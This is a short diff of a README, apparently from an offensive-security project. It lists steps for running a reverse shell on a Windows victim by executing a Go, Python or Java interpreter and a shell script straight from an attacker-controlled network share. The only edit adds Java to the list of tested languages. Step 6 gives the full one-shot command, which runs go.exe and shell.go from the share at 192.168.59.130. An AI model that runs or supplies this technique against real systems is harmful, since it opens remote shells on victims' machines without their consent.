@@ -10,7 +10,7 @@ The process is extremely simple.
 1. Have a Windows Victim where you can run commands
 2. Have a Windows Attack Box with your Programming Environment of choice - Python Java and Go are the only ones I have tested so far
 3. Have a Kali Box or NCat on your Windows Attack Box to catch the Reverse Shell
-4. Share the Folder where your Python/Go.exe Application is
+4. Share the Folder where your Python/Java/Go.exe Application is
 5. Have your Reverse Shell script also in the same folder
 6. Run your one shot command in CMD/PowerShell i.e with Go it is `\\192.168.59.130\Go\go.exe run \\192.168.59.130\Go\shell.go` where `\\192.168.59.130\Go\` is the Attacker Controlled Remote Share and `run` for `go run` and `\\192.168.59.130\Go\shell.go` is the Reverse Shell Code.
 
